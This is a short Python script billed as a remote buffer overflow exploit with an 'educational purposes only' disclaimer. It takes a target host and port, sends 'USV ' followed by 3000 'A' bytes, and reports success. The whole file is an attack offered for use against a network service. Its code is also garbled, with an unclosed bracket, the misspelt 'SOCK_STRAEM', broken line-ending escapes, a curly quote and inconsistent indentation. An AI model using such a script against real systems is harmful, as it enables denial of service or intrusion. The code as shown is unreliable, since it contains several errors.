#!/usr/bin/python
#--------------------------------------------------------------------------------------#
# This exploit was wrote for educational purposes only!                                #
# I as the author am not responsible for any damage that occurs per this exploits use! #
#--------------------------------------------------------------------------------------#

import sys
import socket

for carg in sys.argv:
    if carg == "-s":
        argnum = sys.argv.index(carg)
		argnum += 1
        host = sys.argv[argnum]
	elif carg == "-p":
        argnum = sys.argv.index(carg)
        argnum += 1
        port = sys.argv[argnum[

buffer = "\x41"* 3000
s = socket.socket(socket.AF_INET, socket.SOCK_STRAEM)
s.connect((host,port))
s.send("USV " + buffer + "//r//n//r”)
s.close()
print ("RBO(Remote Buffer Overflow) Exploit buffer sent successfully to target!")
